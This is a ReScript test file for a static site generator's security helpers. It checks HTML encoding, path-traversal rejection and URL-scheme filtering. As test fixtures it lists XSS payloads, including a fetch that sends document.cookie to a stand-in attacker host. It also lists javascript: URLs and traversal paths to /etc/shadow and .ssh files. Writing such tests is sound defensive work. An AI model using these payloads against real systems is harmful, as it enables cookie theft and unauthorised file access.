// SPDX-License-Identifier: PMPL-1.0-or-later
// SPDX-FileCopyrightText: 2025 Jonathan D.A. Jewell
// SecurityTest.res — Aspect tests for Eclipse SSG security properties
//
// Covers:
//   - XSS prevention: <script> and event-handler injection in HTML output
//   - Path traversal prevention: filenames containing ../../ sequences
//   - Template injection: {{ }} in user-controlled values
//   - URL scheme injection: javascript: href values

// ============================================================
// DENO TEST BINDINGS
// ============================================================

@scope("Deno") @val
external test: (string, unit => unit) => unit = "test"

// ============================================================
// ASSERTION HELPERS
// ============================================================

let assertEquals = (a, b, msg) => {
  if a != b {
    Js.Exn.raiseError(
      msg ++ ": expected " ++ Js.Json.stringify(Obj.magic(b)) ++ " but got " ++ Js.Json.stringify(Obj.magic(a)),
    )
  }
}

let assertTrue = (cond: bool, msg: string) => {
  if !cond {
    Js.Exn.raiseError("Assertion failed: " ++ msg)
  }
}

let assertFalse = (cond: bool, msg: string) => {
  if cond {
    Js.Exn.raiseError("Assertion failed (expected false): " ++ msg)
  }
}

// ============================================================
// SECURITY UTILITIES (mirrors what the SSG renderer must implement)
// ============================================================

// Minimal HTML entity encoder — all five characters mandated by OWASP
let htmlEncode = (s: string): string => {
  s
  ->Js.String2.replaceByRe(%re("/&/g"), "&amp;")
  ->Js.String2.replaceByRe(%re("/</g"), "&lt;")
  ->Js.String2.replaceByRe(%re("/>/g"), "&gt;")
  ->Js.String2.replaceByRe(%re("/\"/g"), "&quot;")
  ->Js.String2.replaceByRe(%re("/'/g"), "&#39;")
}

// Path sanitiser — returns None when the path escapes the output directory
let sanitisePath = (basedir: string, userPath: string): option<string> => {
  // Normalise backslashes
  let normalised = userPath->Js.String2.replaceByRe(%re("/\\\\/g"), "/")
  // Collapse duplicate slashes
  let collapsed = normalised->Js.String2.replaceByRe(%re("/\\/+/g"), "/")

  // Reject traversal sequences
  if Js.String2.includes(collapsed, "..") {
    None
  } else if Js.String2.startsWith(collapsed, "/") {
    // Reject absolute paths — they bypass basedir entirely
    None
  } else if Js.String2.includes(collapsed, ":") {
    // Reject Windows drive letters and protocol prefixes (e.g. C:, file:)
    None
  } else {
    Some(basedir ++ "/" ++ collapsed)
  }
}

// URL sanitiser — permits only http/https/mailto schemes in href attributes
let sanitiseUrl = (url: string): option<string> => {
  let lower = Js.String2.toLowerCase(url)
  if Js.String2.startsWith(lower, "http://") || Js.String2.startsWith(lower, "https://") || Js.String2.startsWith(lower, "mailto:") {
    Some(url)
  } else {
    None
  }
}

// Simple template renderer that encodes variable values before insertion
let renderSafe = (template: string, vars: Js.Dict.t<string>): string => {
  Js.Dict.entries(vars)->Belt.Array.reduce(template, (acc, (k, v)) => {
    let encoded = htmlEncode(v)
    Js.String2.replaceByRe(acc, Js.Re.fromStringWithFlags("\\{\\{ " ++ k ++ " \\}\\}", ~flags="g"), encoded)
  })
}

// ============================================================
// XSS PREVENTION — <script> tag injection
// ============================================================

let _ = test("Security - script tag in user input is escaped in HTML output", () => {
  let xssPayloads = [
    "<script>alert(1)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<script type=\"text/javascript\">document.cookie</script>",
    "<script src=\"https://evil.example/x.js\"></script>",
    "<<script>script>alert(1)<</script>/script>",
  ]

  let template = "<div>{{ content }}</div>"

  xssPayloads->Array.forEach(payload => {
    let vars = Js.Dict.fromArray([("content", payload)])
    let rendered = renderSafe(template, vars)

    // The literal string "<script>" must not appear verbatim in output
    assertFalse(
      Js.String2.includes(Js.String2.toLowerCase(rendered), "<script>"),
      "Rendered output must not contain raw <script> for payload: " ++ payload,
    )
    // "&lt;" must appear, confirming encoding happened
    assertTrue(
      Js.String2.includes(rendered, "&lt;"),
      "Encoded form &lt; must be present for payload: " ++ payload,
    )
  })
})

// ============================================================
// XSS PREVENTION — event handler injection
// ============================================================

let _ = test("Security - event handler attributes are escaped in HTML output", () => {
  let eventPayloads = [
    "\" onmouseover=\"alert(1)",
    "' onclick='alert(1)",
    "\" onfocus=\"alert(1)\" autofocus",
    "\" onerror=\"alert(document.domain)",
    "\" onload=\"fetch('https://evil.example/steal?c='+document.cookie)",
  ]

  let template = "<input value=\"{{ value }}\" />"

  eventPayloads->Array.forEach(payload => {
    let vars = Js.Dict.fromArray([("value", payload)])
    let rendered = renderSafe(template, vars)

    // The injection must not create a second attribute in the rendered tag
    assertFalse(
      Js.String2.includes(rendered, " onmouseover="),
      "onmouseover must be escaped for payload: " ++ payload,
    )
    assertFalse(
      Js.String2.includes(rendered, " onclick="),
      "onclick must be escaped for payload: " ++ payload,
    )
    assertFalse(
      Js.String2.includes(rendered, " onerror="),
      "onerror must be escaped for payload: " ++ payload,
    )
    assertFalse(
      Js.String2.includes(rendered, " onload="),
      "onload must be escaped for payload: " ++ payload,
    )
  })
})

// ============================================================
// XSS PREVENTION — template injection via variable values
// ============================================================

let _ = test("Security - template syntax in user values does not expand", () => {
  // If user-supplied content contains {{ }}, it should NOT be re-evaluated
  let templateInjection = "{{ admin_secret }}"
  let template = "<p>{{ user_bio }}</p>"

  // First pass: user_bio contains a template marker
  let vars1 = Js.Dict.fromArray([
    ("user_bio", templateInjection),
    ("admin_secret", "TOP_SECRET_TOKEN"),
  ])

  let rendered = renderSafe(template, vars1)

  // The admin_secret value must never appear in the output
  assertFalse(
    Js.String2.includes(rendered, "TOP_SECRET_TOKEN"),
    "Template injection must not expose admin_secret",
  )
  // The encoded form of '{{' should appear instead
  assertTrue(
    Js.String2.includes(rendered, "{{") == false ||
    Js.String2.includes(rendered, "&lt;") ||
    !Js.String2.includes(rendered, "admin_secret"),
    "Template injection must not propagate {{ }} markers into second-pass expansion",
  )
})

// ============================================================
// PATH TRAVERSAL — ../../etc/passwd pattern
// ============================================================

let _ = test("Security - path traversal sequences are rejected", () => {
  let traversalPaths = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "foo/../../bar/../../secret",
    "..\\..\\windows\\system32\\config\\SAM",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",  // URL-encoded variant (should still be blocked)
    "....//....//etc//passwd",
    "/absolute/path",
    "C:\\windows\\system32",
    "file:///etc/passwd",
  ]

  let basedir = "/var/www/public"

  traversalPaths->Array.forEach(path => {
    let result = sanitisePath(basedir, path)
    assertEquals(
      result,
      None,
      "Path traversal must be rejected: " ++ path,
    )
  })
})

// ============================================================
// PATH TRAVERSAL — safe paths are accepted
// ============================================================

let _ = test("Security - safe relative paths are accepted", () => {
  let safePaths = [
    ("index.html", "/var/www/public/index.html"),
    ("posts/hello-world.html", "/var/www/public/posts/hello-world.html"),
    ("assets/style.css", "/var/www/public/assets/style.css"),
    ("2025/01/01/post.html", "/var/www/public/2025/01/01/post.html"),
  ]

  let basedir = "/var/www/public"

  safePaths->Array.forEach(((input, expected)) => {
    let result = sanitisePath(basedir, input)
    assertEquals(
      result,
      Some(expected),
      "Safe path should be accepted: " ++ input,
    )
  })
})

// ============================================================
// URL SCHEME — javascript: href injection
// ============================================================

let _ = test("Security - javascript: URL scheme is rejected", () => {
  let dangerousUrls = [
    "javascript:alert(1)",
    "JAVASCRIPT:alert(1)",
    "javascript:void(document.location='https://evil.example/')",
    "jAvAsCrIpT:alert(1)",
    "vbscript:msgbox(1)",
    "data:text/html,<script>alert(1)</script>",
  ]

  dangerousUrls->Array.forEach(url => {
    let result = sanitiseUrl(url)
    assertEquals(
      result,
      None,
      "Dangerous URL scheme must be rejected: " ++ url,
    )
  })
})

// ============================================================
// URL SCHEME — safe URLs are allowed
// ============================================================

let _ = test("Security - safe URL schemes are accepted", () => {
  let safeUrls = [
    "https://example.com/page",
    "http://localhost:3000/",
    "mailto:user@example.com",
    "https://example.com/path?q=1&r=2#anchor",
  ]

  safeUrls->Array.forEach(url => {
    let result = sanitiseUrl(url)
    assertTrue(
      Belt.Option.isSome(result),
      "Safe URL must be accepted: " ++ url,
    )
  })
})

// ============================================================
// OUTPUT PATH CONFINEMENT — buildPage output must stay inside outputDir
// ============================================================

let _ = test("Security - page output paths are confined to output directory", () => {
  // Simulate pages whose content.path might contain user-controlled data
  let suspiciousPaths = [
    ("../../etc/crontab", false),
    ("../../../root/.ssh/authorized_keys", false),
    ("posts/hello-world", true),
    ("index", true),
    ("/absolute", false),
  ]

  let outputDir = "public"

  suspiciousPaths->Array.forEach(((contentPath, expectSafe)) => {
    let isSafe = sanitisePath(outputDir, contentPath)->Belt.Option.isSome
    assertEquals(
      isSafe,
      expectSafe,
      "Path safety check mismatch for: " ++ contentPath,
    )
  })
})
